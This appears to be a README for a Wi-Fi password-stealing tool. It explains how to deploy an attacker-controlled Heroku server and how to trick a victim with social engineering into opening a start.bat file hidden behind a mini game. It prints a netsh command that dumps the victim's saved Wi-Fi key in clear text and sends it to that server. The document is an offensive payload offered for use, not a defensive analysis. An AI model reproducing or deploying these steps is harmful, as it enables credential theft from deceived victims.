# parrot wiifi hacking tool
this is a simple payload that sends the password of a known wifi  to rouge sever.
# requirements
node.js https://nodejs.org/en/download/  
heroku account https://signup.heroku.com/  
heroku cli https://devcenter.heroku.com/articles/heroku-cli#download-and-install  

# usage
git clone https://github.com/ba5liel/parrot.git
cd parrot  
heroku login  
git push -u heroku  
send the payload.zip to victim using any social engineering techniques. and make sure the victim opens the start.bat file  
now you can see the password at [yourapp].heroku.com  
# payload
this include a mini game that launches when start.bat is opened.  
you must change the start.bat in the payload    

netsh wlan show profile "victim wifi name here" key=clear > bin\log.txt  

#enjoy
